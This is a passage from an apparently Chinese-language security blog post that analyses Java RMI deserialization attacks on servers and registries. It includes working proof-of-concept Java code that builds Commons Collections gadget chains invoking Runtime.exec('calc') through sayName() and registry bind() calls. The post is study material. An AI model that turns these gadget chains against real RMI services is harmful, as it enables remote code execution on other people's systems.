+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">fakeTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">1</span><span class="p">)};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">chainPart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">1</span><span class="p">)};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">fakeTransformer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">haha</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">lazy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">haha</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TiedMapEntry</span><span class="w"> </span><span class="n">outerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">(</span><span class="n">lazy</span><span class="p">,</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashSet</span><span class="w"> </span><span class="n">hashSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashSet</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashSet</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">outerMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">haha</span><span class="p">.</span><span class="na">remove</span><span class="p">(</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;iTransformers&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field1</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">chain</span><span class="p">,</span><span class="n">chainPart</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//获取注册表对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">getRegistry</span><span class="p">(</span><span class="s">&#34;localhost&#34;</span><span class="p">,</span><span class="n">1099</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Arrays</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="na">list</span><span class="p">()));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//寻找对应RMI实例</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RemoteInterface</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RemoteInterface</span><span class="p">)</span><span class="w"> </span><span class="n">Naming</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;Hello&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//调用远程对象的方法</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">o</span><span class="p">.</span><span class="na">sayHello</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">o</span><span class="p">.</span><span class="na">sayName</span><span class="p">(</span><span class="n">hashSet</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后运行服务端和客户端，成功弹出计算机：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240919133157829.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919133157829"
+	
+	
+></p>
+<p>运行结果为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[Hello]
+</span></span><span class="line"><span class="cl">Hello welcome to use
+</span></span><span class="line"><span class="cl">hello[fupanc=1]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="其他利用">其他利用
+</h5><p>在前面，我们是保证Server端和Client端调用的服务接口是一样的，那么如果不一致如何利用。</p>
+<p>所以我们可以尝试传递的是 Server 端能找到的参数是 HelloObject 的 Method 的 hash，但是传递的参数却不是 HelloObject 而是恶意的反序列化数据（可能是 Object或其他的类）呢？</p>
+<p>答案是可以的，在 mogwailabs 的 [PPT](<a class="link" href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides"  target="_blank" rel="noopener"
+    >https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides</a> Exploiting RMI Services.pdf) 中提出了以下 4 种方法：</p>
+<ul>
+<li>通过网络代理，在流量层修改数据</li>
+<li>自定义 “java.rmi” 包的代码，自行实现</li>
+<li>字节码修改</li>
+<li>使用 debugger</li>
+</ul>
+<p>并且在 PPT 中还给出了 hook 点，那就是动态代理中使用的 RemoteObjectInvocationHandler 的 <code>invokeRemoteMethod</code> 方法。</p>
+<p>Afant1 师傅使用了 Java Agent 的方式，在<a class="link" href="https://www.anquanke.com/post/id/200860"  target="_blank" rel="noopener"
+    >这篇文章</a>里，0c0c0f 师傅使用了流量层的替换，在<a class="link" href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg"  target="_blank" rel="noopener"
+    >这篇文章</a>里，有兴趣的师傅请自行查看。</p>
+<p>最简单的debugger没复现出来，以后再说吧，学学其他的只有方法，学了java agent后就来把这个复现了。</p>
+<p>利用方面：个人感觉其实还是挺广的，比如服务端要求只接收一个类型的参数，但是我就是要传反序列化的进去。大概就这样解决了。</p>
+<p>总结就是 Server端的调用方法存在非基础类型的参数时，就可以被恶意 Client 端传入</p>
+<h4 id="动态类加载-1">动态类加载
+</h4><p>在前面也说过，RMI的重要特性：动态类加载机制。就是当本地 ClassPath 中无法找到响应的类时，会在指定的codebase 里加载 class。这个特性在 6u45/7u21 之前都是默认开启的。</p>
+<p>为了能够远程加载目标类，需要 Serrver 加载并配置 SecurityManager，并设置<code>java.rmi.server.useCodebaseOnly=false</code>。</p>
+<p>Server 端调用 UnicastServerRef 的<code>dispatch</code>方法处理客户端请求，调用<code>unmarshalParameters</code>方法反序列化客户端传来的参数。</p>
+<p>这个方法的反序列化由MarshalInputStream类实现，跟进它的resolveClass方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240919175810389.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919175810389"
+	
+	
+></p>
+<p>这里通过readLocation()方法获取codebase地址。</p>
+<p>然后需要满足useCodebaseOnly为false，然后才能传入codebase变量。</p>
+<p>然后调用RMIClassLoader#loadClass()方法来加载类，实际上委托的是sun.rmi.server.LoaderHandler.loadClass方法。</p>
+<p>方法中调用到了loadClassForName()方法</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/1633484434881.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="img"
+	
+	
+></p>
+<p>通过 <code>Class.forName()</code> 传入自定义类加载器 <code>LoaderHandler$Loader</code> 来从远程地址加载类。</p>
+<p>而 <code>LoaderHandler$Loader</code> 是 URLClassLoader 的子类。</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/1633484330433.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="img"
+	
+	
+></p>
+<p>最后会调用到URLClassLoader.loadClass方法来加载类</p>
+<p>因此 Client 端可以通过配置此项属性，并向 Server 端传递不存在的类，使 Server 端试图从 <code>java.rmi.server.codebase</code> 地址中远程加载恶意类而触发攻击。</p>
+<h4 id="替身攻击">替身攻击
+</h4><p>当远程对象接收参数类型不再是Object，而是指定类型（远程对象类型）。</p>
+<p>而攻击者希望使用 CC 链来反序列化，比如使用了一个入口点为HashMap的exp，那么攻击者在本地的环境中将HashMap重写，让HashMap继承注册的远程对象（RemoteObject）</p>
+<p>（了解一下这个思路，其实和前面说的那个有点重合了。不多说）</p>
+<h3 id="攻击注册中心">攻击注册中心
+</h3><p>对应的反序列化触发点在RegistryImpl_Skel类的dispatch()方法。当调用Naming.lookup()方法或bind()方法时，都会调用到这个dispatch()方法中，也就是对应的switch/case方法。</p>
+<p>注册中心的基本方法：</p>
+<ul>
+<li>bind()</li>
+<li>list()</li>
+<li>lookup()</li>
+<li>rebind()</li>
+<li>unbind()</li>
+</ul>
+<p>前面我们就分析了，在Client端或者Server端调用这些基本方法时，基本都会进入到这里的switch/case语句再次调用。</p>
+<p>并且在这些基本方法中，<strong>有的还会反序列化RemoteCall字节流来获取远程对象和RMI服务名称</strong>，就有可能会触发反序列化攻击。</p>
+<p><strong>需要注意的是</strong>：一般Java远程访问注册中心做了限制，只有来源地址为本地才能调用bind、rebind、unbind方法。</p>
+<h4 id="bindrebind">bind/rebind
+</h4><p>（一般这个可以归类为服务端攻击）</p>
+<p>这两个方法附近都是调用了反序列化的。
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240919185132869.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919185132869"
+	
+	
+></p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240919185110734.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919185110734"
+	
+	
+></p>
+<p>所以这里使用这两个都是可以的。</p>
+<p>而bind()方法参数需要一个Remote类型的对象：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240919185245552.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919185245552"
+	
+	
+></p>
+<p>如何满足呢，<strong>动态代理</strong>，这是因为<strong>当代理类proxy被反序列化时，被代理对象也会被反序列化</strong>，自然也会执行POC链。</p>
+<p>操作点就很多了，在CC1中利用AnnotationInvocationHandler，它是InvocationHandler的子类，可以再次借用，来修改传入参数的类型。如下操作：</p>
+<p>CC1+动态代理：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">Rmi.Server</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Remote</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Retention</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMI_attack</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Transformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Map</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Map</span><span class="w"> </span><span class="n">outerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">constructor1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">outerMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="n">interfaces</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getInterfaces</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Map</span><span class="w"> </span><span class="n">proxyMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">LazyMap</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="n">interfaces</span><span class="p">,</span><span class="n">handler</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">proxyMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Remote</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Remote</span><span class="p">)</span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">Remote</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Remote</span><span class="p">.</span><span class="na">class</span><span class="p">},(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="n">o</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Registry</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">getRegistry</span><span class="p">(</span><span class="s">&#34;localhost&#34;</span><span class="p">,</span><span class="n">1099</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">r</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;fupanc&#34;</span><span class="p">,</span><span class="n">proxy</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里用的LazyMap链，同样的TransformedMap链也能用。</p>
+<p>（但是有点小怪的就是不应该只有8u71以下才能弹吗，8u411也能弹了？）</p>
+<h4 id="unbindlookup">unbind/lookup
+</h4><p>这两个方法的利用也许有JDK版本要求？JDK8u411并没有看到反序列化，而JDK8u71却有反序列化操作。这里先用JDK8u71看看。</p>
+<p>（虽然注册中心有限制，但是lookup()方法在客户端也是能用的）</p>
+<p>在JDK8u71中，这两个方法也存在反序列化：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240920151533628.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240920151533628"
+	
+	
+></p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240920151601633.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240920151601633"
+	
+	
+></p>
+<p>如果能控制var10，就能造成任意类反序列化。即现在需要控制这个var2，虽然这改成了8u71，但是过程差不多。</p>
+<p>溯源一下参数，可以发现这里的var2就是StreamRemoteCall对象，也就是那个连接对象。</p>
+<p>相关的传输过程：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240921134821912.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240921134821912"
+	
+	
+></p>
+<p>这里就是调用的Invoke()方法来传输数据。</p>
+<p>所以我们可以调用this.invoke方法来传输请求到注册中心。需要的参数如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240921142056529.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240921142056529"
+	
+	
+></p>
+<p>先获取对应的RegistryImpl_Stub对象：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">getRegistry</span><span class="p">(</span><span class="s">&#34;127.0.0.1&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">1099</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后获取到这个ref变量，这个ref是Registryimpl_Stub类的父类的父类的变量，这个变量的赋值在前面注册中心创建那里是说明了的，如下代码获取：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Field</span><span class="w"> </span><span class="n">field0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">registry</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getSuperclass</span><span class="p">().</span><span class="na">getSuperclass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;ref&#34;</span><span class="p">);</span><span class="w">
